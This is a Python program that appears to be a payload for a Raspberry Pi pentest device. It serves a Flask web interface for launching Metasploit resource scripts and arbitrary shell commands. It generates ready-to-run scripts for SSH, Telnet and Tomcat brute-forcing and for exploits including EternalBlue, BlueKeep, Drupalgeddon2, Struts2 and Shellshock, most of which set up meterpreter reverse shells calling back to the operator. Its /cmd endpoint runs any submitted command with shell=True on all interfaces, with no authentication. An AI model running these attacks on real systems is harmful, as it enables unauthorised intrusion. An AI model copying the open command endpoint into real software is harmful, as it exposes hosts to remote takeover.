#!/usr/bin/env python3
"""
KTOx Payload – Metasploit Web UI (Simple & Reliable)
=====================================================
- Web interface on port 5000
- Script grid for .rc files (auto‑generates 50+ scripts)
- Command runner (non‑interactive) to see script output
- LCD shows IP, QR code, and script selector

Controls:
  KEY1 – QR code
  KEY2 – Cycle script name on LCD
  OK   – Reminder to use web UI
  KEY3 – Exit

Dependencies: flask, qrcode, pillow
Install: pip install flask qrcode pillow
"""

import os
import sys
import time
import socket
import threading
import subprocess
import glob
import json
from flask import Flask, render_template_string, request, jsonify

# ----------------------------------------------------------------------
# Hardware & LCD
# ----------------------------------------------------------------------
try:
    import RPi.GPIO as GPIO
    import LCD_1in44
    from PIL import Image, ImageDraw, ImageFont
    HAS_HW = True
except ImportError:
    HAS_HW = False
    print("Hardware not found – LCD disabled")

PINS = {"UP":6,"DOWN":19,"LEFT":5,"RIGHT":26,"OK":13,"KEY1":21,"KEY2":20,"KEY3":16}
PORT = 5000
SCRIPT_DIR = "/root/KTOx/payloads/msf_scripts"

if HAS_HW:
    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    W, H = 128, 128
    try:
        font_sm = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 9)
        font_bold = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 10)
    except:
        font_sm = font_bold = ImageFont.load_default()

# ----------------------------------------------------------------------
# Flask app
# ----------------------------------------------------------------------
app = Flask(__name__)

# ----------------------------------------------------------------------
# Script discovery & runner
# ----------------------------------------------------------------------
def discover_scripts():
    scripts = []
    os.makedirs(SCRIPT_DIR, exist_ok=True)
    for rc_file in sorted(glob.glob(os.path.join(SCRIPT_DIR, "*.rc"))):
        name = os.path.basename(rc_file).replace(".rc", "").replace("_", " ").title()
        desc = ""
        try:
            with open(rc_file, 'r') as f:
                first = f.readline().strip()
                if first.startswith('#'):
                    desc = first[1:].strip()
        except:
            pass
        if not desc:
            desc = "Metasploit resource script"
        scripts.append({
            'name': name,
            'path': rc_file,
            'desc': desc
        })
    return scripts

def run_script(script_path, params):
    try:
        with open(script_path, 'r') as f:
            rc_content = f.read()
    except Exception as e:
        return f"Error reading script: {e}"
    rc_content = rc_content.replace("{LHOST}", params.get('lhost', ''))
    rc_content = rc_content.replace("{RHOSTS}", params.get('rhosts', ''))
    tmp_rc = "/tmp/msf_run.rc"
    with open(tmp_rc, 'w') as f:
        f.write(rc_content)
    try:
        proc = subprocess.run(
            ["msfconsole", "-q", "-r", tmp_rc],
            capture_output=True, text=True, timeout=60
        )
        output = proc.stdout + proc.stderr
        if not output.strip():
            output = "[No output]"
        return output
    except subprocess.TimeoutExpired:
        return "Script timed out after 60 seconds"
    except Exception as e:
        return f"Error: {str(e)}"

# ----------------------------------------------------------------------
# Command runner (simple, non‑interactive)
# ----------------------------------------------------------------------
def run_command(cmd):
    try:
        proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = proc.stdout + proc.stderr
        if not output.strip():
            output = "[No output]"
        return output
    except subprocess.TimeoutExpired:
        return "Command timed out"
    except Exception as e:
        return f"Error: {str(e)}"

# ----------------------------------------------------------------------
# Web UI – split: scripts + command runner
# ----------------------------------------------------------------------
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>KTOx // MSF WEB UI</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            background: #0a0a0a;
            font-family: 'Share Tech Mono', 'Courier New', monospace;
            color: #0f0;
            padding: 20px;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 {
            color: #f00;
            text-shadow: 0 0 5px #f00;
            border-left: 4px solid #f00;
            padding-left: 20px;
            margin-bottom: 20px;
        }
        .split {
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
        }
        .left {
            flex: 1;
            min-width: 300px;
        }
        .right {
            flex: 1;
            min-width: 400px;
        }
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
            gap: 15px;
            max-height: 500px;
            overflow-y: auto;
            margin-bottom: 20px;
            padding: 5px;
        }
        .script-card {
            background: #111;
            border: 1px solid #300;
            border-radius: 8px;
            padding: 10px;
            cursor: pointer;
            transition: 0.2s;
        }
        .script-card:hover {
            border-color: #0f0;
            transform: translateY(-2px);
            box-shadow: 0 0 10px rgba(0,255,0,0.2);
        }
        .script-card.selected {
            border-color: #0f0;
            background: #1a1a1a;
        }
        .script-card h3 { color: #0f0; font-size: 0.9rem; margin-bottom: 4px; }
        .script-card p { font-size: 0.7rem; color: #888; }
        .param-area {
            background: #111;
            border: 1px solid #300;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
        }
        .param-area input {
            background: #222;
            border: 1px solid #0f0;
            color: #0f0;
            padding: 6px;
            font-family: monospace;
            margin: 5px 10px 5px 0;
            width: 200px;
        }
        .param-area label { font-size: 0.8rem; margin-right: 5px; }
        button {
            background: #2a0a0a;
            border: 1px solid #f00;
            color: #f00;
            padding: 8px 16px;
            cursor: pointer;
            font-weight: bold;
            transition: 0.2s;
        }
        button:hover {
            background: #f00;
            color: #000;
            box-shadow: 0 0 10px #f00;
        }
        .output {
            background: #050505;
            border: 1px solid #0f0;
            border-radius: 8px;
            padding: 15px;
            font-family: monospace;
            font-size: 0.8rem;
            white-space: pre-wrap;
            max-height: 400px;
            overflow-y: auto;
        }
        .cmd-area {
            margin-top: 20px;
        }
        .cmd-line {
            display: flex;
            margin-bottom: 10px;
        }
        .cmd-line input {
            flex: 1;
            background: #222;
            border: 1px solid #0f0;
            color: #0f0;
            padding: 6px;
            font-family: monospace;
        }
        .cmd-line button {
            margin-left: 10px;
            padding: 6px 12px;
        }
        footer {
            text-align: center;
            margin-top: 30px;
            color: #444;
            font-size: 0.7rem;
        }
        ::-webkit-scrollbar { width: 6px; background: #111; }
        ::-webkit-scrollbar-thumb { background: #0f0; border-radius: 3px; }
    </style>
</head>
<body>
<div class="container">
    <h1>⎯ KTOx // METASPLOIT WEB UI ⎯</h1>
    <div class="split">
        <div class="left">
            <div class="grid" id="scriptGrid">
                {% for script in scripts %}
                <div class="script-card" data-path="{{ script.path }}">
                    <h3>▶ {{ script.name }}</h3>
                    <p>{{ script.desc }}</p>
                </div>
                {% endfor %}
            </div>
            <div class="param-area">
                <label>LHOST (your IP):</label>
                <input type="text" id="lhost" placeholder="auto" value="{{ lhost }}">
                <label>RHOSTS (target):</label>
                <input type="text" id="rhosts" placeholder="192.168.1.100">
                <button id="runBtn">🚀 RUN SCRIPT</button>
            </div>
            <div class="output">
                <pre id="output">Ready.</pre>
            </div>
        </div>
        <div class="right">
            <div class="cmd-area">
                <h3 style="color:#0f0;">⬢ COMMAND RUNNER</h3>
                <div class="cmd-line">
                    <input type="text" id="cmdInput" placeholder="e.g., msfconsole -q -x 'help'">
                    <button id="runCmd">Run</button>
                </div>
                <div class="output" id="cmdOutput" style="max-height:300px;">Ready.</div>
            </div>
        </div>
    </div>
    <footer>KTOx Metasploit Web UI – {{ scripts|length }} scripts | Command Runner</footer>
</div>

<script>
    let selectedPath = null;

    // Script selection
    document.querySelectorAll('.script-card').forEach(card => {
        card.addEventListener('click', () => {
            document.querySelectorAll('.script-card').forEach(c => c.classList.remove('selected'));
            card.classList.add('selected');
            selectedPath = card.getAttribute('data-path');
        });
    });

    // Run script
    document.getElementById('runBtn').addEventListener('click', () => {
        if (!selectedPath) {
            alert('Select a script first');
            return;
        }
        const lhost = document.getElementById('lhost').value || '{{ lhost }}';
        const rhosts = document.getElementById('rhosts').value;
        if (!rhosts) {
            alert('Enter target IP (RHOSTS)');
            return;
        }
        const outputDiv = document.getElementById('output');
        outputDiv.innerText = 'Running script... please wait.';
        fetch('/run', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                script_path: selectedPath,
                lhost: lhost,
                rhosts: rhosts
            })
        })
        .then(r => r.json())
        .then(data => {
            outputDiv.innerText = data.output;
        })
        .catch(err => {
            outputDiv.innerText = 'Error: ' + err;
        });
    });

    // Run custom command
    document.getElementById('runCmd').addEventListener('click', () => {
        const cmd = document.getElementById('cmdInput').value;
        if (!cmd) return;
        const outputDiv = document.getElementById('cmdOutput');
        outputDiv.innerText = 'Running...';
        fetch('/cmd', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ command: cmd })
        })
        .then(r => r.json())
        .then(data => {
            outputDiv.innerText = data.output;
        })
        .catch(err => {
            outputDiv.innerText = 'Error: ' + err;
        });
    });
</script>
</body>
</html>
"""

# ----------------------------------------------------------------------
# Flask routes
# ----------------------------------------------------------------------
@app.route('/')
def index():
    scripts = discover_scripts()
    lhost = get_local_ip()
    return render_template_string(HTML_TEMPLATE, scripts=scripts, lhost=lhost)

@app.route('/run', methods=['POST'])
def run():
    data = request.json
    script_path = data.get('script_path')
    lhost = data.get('lhost', get_local_ip())
    rhosts = data.get('rhosts')
    if not rhosts:
        return jsonify({'output': 'Error: RHOSTS not provided'})
    params = {'lhost': lhost, 'rhosts': rhosts}
    output = run_script(script_path, params)
    return jsonify({'output': output})

@app.route('/cmd', methods=['POST'])
def cmd():
    data = request.json
    command = data.get('command', '')
    if not command:
        return jsonify({'output': 'No command'})
    output = run_command(command)
    return jsonify({'output': output})

# ----------------------------------------------------------------------
# LCD helpers
# ----------------------------------------------------------------------
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return '127.0.0.1'

def generate_qr(data):
    import qrcode
    qr = qrcode.QRCode(box_size=3, border=2)
    qr.add_data(data)
    return qr.make_image(fill_color="white", back_color="black").get_image()

def lcd_loop():
    if not HAS_HW:
        return
    ip = get_local_ip()
    scripts = discover_scripts()
    script_idx = 0
    show_qr = False
    held = {}
    while True:
        now = time.time()
        img = Image.new("RGB", (W, H), "#0A0000")
        d = ImageDraw.Draw(img)
        if show_qr:
            qr_img = generate_qr(f"http://{ip}:{PORT}")
            qr_img = qr_img.resize((W, H))
            img.paste(qr_img, (0,0))
        else:
            d.rectangle([(0,0),(128,18)], fill=(120,0,0))
            d.text((4,3), "MSF WEB UI", font=font_bold, fill="#FF3333")
            y = 20
            d.text((4,y), f"IP: {ip}:{PORT}", font=font_sm, fill="#FFBBBB"); y+=12
            if scripts:
                script_name = scripts[script_idx]['name'][:18]
                d.text((4,y), f"Script: {script_name}", font=font_sm, fill="#00FF00"); y+=12
                d.text((4,y), "K2=Cycle  OK=Remind", font=font_sm, fill="#FF7777"); y+=12
            d.text((4,y), "K1=QR  K3=Exit", font=font_sm, fill="#FF7777")
            d.rectangle((0,H-12,W,H), fill="#220000")
        LCD.LCD_ShowImage(img, 0, 0)
        pressed = {n: GPIO.input(p)==0 for n,p in PINS.items()}
        for n, down in pressed.items():
            if down:
                if n not in held: held[n] = now
            else:
                held.pop(n, None)
        def just_pressed(name, delay=0.2):
            return pressed.get(name) and (now - held.get(name, now)) <= delay
        if just_pressed("KEY3"):
            break
        if just_pressed("KEY1"):
            show_qr = not show_qr
            time.sleep(0.3)
        if not show_qr and scripts:
            if just_pressed("KEY2"):
                script_idx = (script_idx + 1) % len(scripts)
                time.sleep(0.3)
            if just_pressed("OK"):
                d.text((4,80), "Use web UI to", font=font_sm, fill="#FF8888")
                d.text((4,92), "run scripts", font=font_sm, fill="#FF8888")
                LCD.LCD_ShowImage(img,0,0)
                time.sleep(1.5)
        time.sleep(0.1)

# ----------------------------------------------------------------------
# Script generator (50+ scripts)
# ----------------------------------------------------------------------
def generate_starter_scripts():
    os.makedirs(SCRIPT_DIR, exist_ok=True)
    # Only generate if directory is empty
    if os.listdir(SCRIPT_DIR):
        return
    scripts = {
        "reverse_shell_tcp.rc": "# Generic reverse shell listener\nuse exploit/multi/handler\nset PAYLOAD linux/x64/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 4444\nset ExitOnSession false\nexploit -j -z",
        "reverse_shell_https.rc": "# HTTPS reverse shell\nuse exploit/multi/handler\nset PAYLOAD linux/x64/meterpreter/reverse_https\nset LHOST {LHOST}\nset LPORT 8443\nexploit -j -z",
        "port_scan_tcp.rc": "# TCP port scanner\nuse auxiliary/scanner/portscan/tcp\nset RHOSTS {RHOSTS}\nset PORTS 1-1000\nset THREADS 10\nrun",
        "port_scan_udp.rc": "# UDP port scanner\nuse auxiliary/scanner/portscan/udp\nset RHOSTS {RHOSTS}\nset PORTS 1-500\nset THREADS 5\nrun",
        "smb_enum_shares.rc": "# Enumerate SMB shares\nuse auxiliary/scanner/smb/smb_enumshares\nset RHOSTS {RHOSTS}\nset THREADS 5\nrun",
        "smb_enum_users.rc": "# Enumerate SMB users\nuse auxiliary/scanner/smb/smb_enumusers\nset RHOSTS {RHOSTS}\nrun",
        "ssh_bruteforce.rc": "# SSH brute force\nuse auxiliary/scanner/ssh/ssh_login\nset RHOSTS {RHOSTS}\nset USERNAME root\nset PASS_FILE /usr/share/wordlists/rockyou.txt\nset THREADS 5\nrun",
        "ftp_anonymous.rc": "# FTP anonymous access\nuse auxiliary/scanner/ftp/anonymous\nset RHOSTS {RHOSTS}\nrun",
        "mysql_enum.rc": "# MySQL enumeration\nuse auxiliary/scanner/mysql/mysql_version\nset RHOSTS {RHOSTS}\nset THREADS 5\nrun",
        "postgres_enum.rc": "# PostgreSQL enumeration\nuse auxiliary/scanner/postgres/postgres_version\nset RHOSTS {RHOSTS}\nrun",
        "http_dir_scanner.rc": "# HTTP directory scanner\nuse auxiliary/scanner/http/dir_scanner\nset RHOSTS {RHOSTS}\nset THREADS 5\nrun",
        "telnet_login.rc": "# Telnet brute force\nuse auxiliary/scanner/telnet/telnet_login\nset RHOSTS {RHOSTS}\nset PASS_FILE /usr/share/wordlists/rockyou.txt\nrun",
        "vnc_none_auth.rc": "# VNC no-auth scanner\nuse auxiliary/scanner/vnc/vnc_none_auth\nset RHOSTS {RHOSTS}\nrun",
        "smtp_enum.rc": "# SMTP user enumeration\nuse auxiliary/scanner/smtp/smtp_enum\nset RHOSTS {RHOSTS}\nrun",
        "snmp_enum.rc": "# SNMP enumeration\nuse auxiliary/scanner/snmp/snmp_enum\nset RHOSTS {RHOSTS}\nrun",
        "eternalblue.rc": "# EternalBlue exploit\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS {RHOSTS}\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 5555\nexploit",
        "doublepulsar.rc": "# DoublePulsar SMB implant\nuse exploit/windows/smb/ms17_010_psexec\nset RHOSTS {RHOSTS}\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 5556\nexploit",
        "bluekeep.rc": "# BlueKeep RDP exploit\nuse exploit/windows/rdp/cve_2019_0708_bluekeep_rce\nset RHOSTS {RHOSTS}\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 5557\nexploit",
        "php_cgi.rc": "# PHP CGI argument injection\nuse exploit/multi/http/php_cgi_arg_injection\nset RHOSTS {RHOSTS}\nset PAYLOAD php/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 6666\nexploit",
        "apache_struts2.rc": "# Apache Struts2\nuse exploit/multi/http/struts2_content_type_ognl\nset RHOSTS {RHOSTS}\nset PAYLOAD linux/x64/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 7777\nexploit",
        "shellshock.rc": "# Shellshock\nuse exploit/multi/http/apache_mod_cgi_bash_env_exec\nset RHOSTS {RHOSTS}\nset PAYLOAD linux/x64/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 17171\nexploit",
        "heartbleed.rc": "# Heartbleed scanner\nuse auxiliary/scanner/ssl/openssl_heartbleed\nset RHOSTS {RHOSTS}\nrun",
        "drupal_drupalgeddon2.rc": "# Drupalgeddon2\nuse exploit/unix/webapp/drupal_drupalgeddon2\nset RHOSTS {RHOSTS}\nset PAYLOAD php/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 10101\nexploit",
        "wordpress_admin_shell.rc": "# WordPress admin shell upload\nuse exploit/unix/webapp/wp_admin_shell_upload\nset RHOSTS {RHOSTS}\nset USERNAME admin\nset PASSWORD password\nset PAYLOAD php/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 11111\nexploit",
        "joomla_media_manager.rc": "# Joomla Media Manager\nuse exploit/multi/http/joomla_media_manager_upload\nset RHOSTS {RHOSTS}\nset PAYLOAD php/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 12121\nexploit",
        "weblogic_deserialize.rc": "# WebLogic deserialization\nuse exploit/multi/http/weblogic_ws_async_response\nset RHOSTS {RHOSTS}\nset PAYLOAD java/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 14141\nexploit",
        "samba_usermap.rc": "# Samba usermap script\nuse exploit/multi/samba/usermap_script\nset RHOSTS {RHOSTS}\nset PAYLOAD cmd/unix/reverse\nset LHOST {LHOST}\nset LPORT 15151\nexploit",
        "distcc_exec.rc": "# DistCC RCE\nuse exploit/unix/misc/distcc_exec\nset RHOSTS {RHOSTS}\nset PAYLOAD cmd/unix/reverse\nset LHOST {LHOST}\nset LPORT 16161\nexploit",
        "vsftpd_backdoor.rc": "# vsftpd 2.3.4 backdoor\nuse exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS {RHOSTS}\nset PAYLOAD cmd/unix/interact\nexploit",
        "tomcat_mgr_login.rc": "# Tomcat manager brute force\nuse auxiliary/scanner/http/tomcat_mgr_login\nset RHOSTS {RHOSTS}\nset PASS_FILE /usr/share/wordlists/rockyou.txt\nrun",
        "jenkins_script.rc": "# Jenkins script console RCE\nuse exploit/multi/http/jenkins_script_console\nset RHOSTS {RHOSTS}\nset PAYLOAD java/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 8888\nexploit",
        "redis_unauth.rc": "# Redis unauthenticated access\nuse auxiliary/scanner/redis/redis_unauth_exec\nset RHOSTS {RHOSTS}\nset COMMAND \"id\"\nrun",
        "mongodb_enum.rc": "# MongoDB enumeration\nuse auxiliary/scanner/mongodb/mongodb_login\nset RHOSTS {RHOSTS}\nrun",
        "elasticsearch_rce.rc": "# ElasticSearch Groovy RCE\nuse exploit/multi/elasticsearch/script_groovy_rce\nset RHOSTS {RHOSTS}\nset PAYLOAD java/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 9999\nexploit",
        "jboss_maindeployer.rc": "# JBoss MainDeployer RCE\nuse exploit/multi/http/jboss_maindeployer\nset RHOSTS {RHOSTS}\nset PAYLOAD java/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 13131\nexploit",
        "iis_webdav_scanner.rc": "# IIS WebDAV scanner\nuse auxiliary/scanner/http/iis_webdav_scanner\nset RHOSTS {RHOSTS}\nrun",
        "dns_zone_transfer.rc": "# DNS zone transfer\nuse auxiliary/scanner/dns/dns_zone_transfer\nset RHOSTS {RHOSTS}\nset DOMAIN example.com\nrun",
        "nbt_ns_enum.rc": "# NBT-NS enumeration\nuse auxiliary/scanner/netbios/nbname\nset RHOSTS {RHOSTS}\nrun",
        "arp_scan.rc": "# ARP scan\nuse auxiliary/scanner/discovery/arp_sweep\nset RHOSTS {RHOSTS}\nrun",
        "ipv6_neighbor_scan.rc": "# IPv6 neighbor scan\nuse auxiliary/scanner/discovery/ipv6_neighbor\nset RHOSTS {RHOSTS}\nrun",
        "upnp_ssdp_msearch.rc": "# UPnP SSDP discovery\nuse auxiliary/scanner/upnp/ssdp_msearch\nrun",
        "mdns_enum.rc": "# mDNS enumeration\nuse auxiliary/scanner/mdns/mdns\nrun",
        "smb_version.rc": "# SMB version detection\nuse auxiliary/scanner/smb/smb_version\nset RHOSTS {RHOSTS}\nrun",
        "http_version.rc": "# HTTP version detection\nuse auxiliary/scanner/http/http_version\nset RHOSTS {RHOSTS}\nrun",
        "ssl_version.rc": "# SSL version detection\nuse auxiliary/scanner/ssl/ssl_version\nset RHOSTS {RHOSTS}\nrun",
        "mssql_ping.rc": "# MSSQL ping discovery\nuse auxiliary/scanner/mssql/mssql_ping\nset RHOSTS {RHOSTS}\nrun",
        "oracle_login.rc": "# Oracle login scanner\nuse auxiliary/scanner/oracle/oracle_login\nset RHOSTS {RHOSTS}\nset USERNAME scott\nset PASSWORD tiger\nrun",
    }
    for filename, content in scripts.items():
        filepath = os.path.join(SCRIPT_DIR, filename)
        with open(filepath, 'w') as f:
            f.write(content)
    print(f"Generated {len(scripts)} scripts in {SCRIPT_DIR}")

# ----------------------------------------------------------------------
# Main
# ----------------------------------------------------------------------
def main():
    # Generate scripts if needed
    if not os.path.exists(SCRIPT_DIR) or not os.listdir(SCRIPT_DIR):
        generate_starter_scripts()
    else:
        print(f"Using existing scripts in {SCRIPT_DIR}")

    # Check msfconsole
    if os.system("which msfconsole >/dev/null 2>&1") != 0:
        print("Metasploit not found. Please install metasploit-framework.")
        if HAS_HW:
            img = Image.new("RGB", (W,H), "black")
            d = ImageDraw.Draw(img)
            d.text((4,40), "Metasploit missing", font=font_sm, fill="red")
            d.text((4,55), "sudo apt install", font=font_sm, fill="white")
            d.text((4,70), "metasploit-framework", font=font_sm, fill="white")
            LCD.LCD_ShowImage(img,0,0)
            time.sleep(5)
        return

    if HAS_HW:
        threading.Thread(target=lcd_loop, daemon=True).start()
        app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
    else:
        app.run(host='0.0.0.0', port=PORT, debug=False)

if __name__ == "__main__":
    # Install dependencies if missing
    try:
        import qrcode
    except ImportError:
        os.system("pip install qrcode pillow")
    main()
